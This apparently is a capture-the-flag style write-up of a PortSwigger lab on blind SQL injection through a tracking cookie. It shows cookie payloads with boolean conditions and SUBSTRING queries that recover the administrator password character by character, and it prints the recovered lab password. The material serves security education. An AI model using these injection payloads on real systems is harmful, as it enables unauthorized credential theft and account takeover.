# Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability in a tracking
cookie. The SQL query uses the value supplied in the cookie, but its
normal result is not shown and no database error is displayed.

Instead, the application shows a `Welcome back` message when the query
returns at least one row. This difference in the response can therefore
be used as a true/false signal.

The database contains a `users` table with `username` and `password`
columns. The objective is to determine the administrator's password and
then log in.

Hint: The password contains only lowercase letters and numbers.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection/blind
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

------------------------------------------------------------------------

The SQL injection point is the tracking cookie.

**Pic 1**

A true condition causes the application to display `Welcome back!`:

``` text
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='1;
```

**Pic 2**

When the condition is false, the message is not displayed:

``` text
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='0;
```

**Pic 3**

This true/false behavior can be used to test individual password
characters. For example, the following condition checks whether the
first character of the administrator password is `s`:

``` text
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='s
```

The same condition can be placed inside the cookie:

``` text
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,1)='s
```

The request can then be sent to Intruder to test possible characters.

**Pic 4**

The first character is confirmed as `s`, so the next position can be
tested:

``` text
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,2)='ss
```

``` text
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,2)='ss
```

**Pic 5**

A more efficient approach is to test one character position at a time:

``` text
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),2,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),3,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),4,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),5,1)='a
...
```

Repeating the process until every position is identified gives the
password:

``` text
ssmyivfjyj5m1bvch02g
```
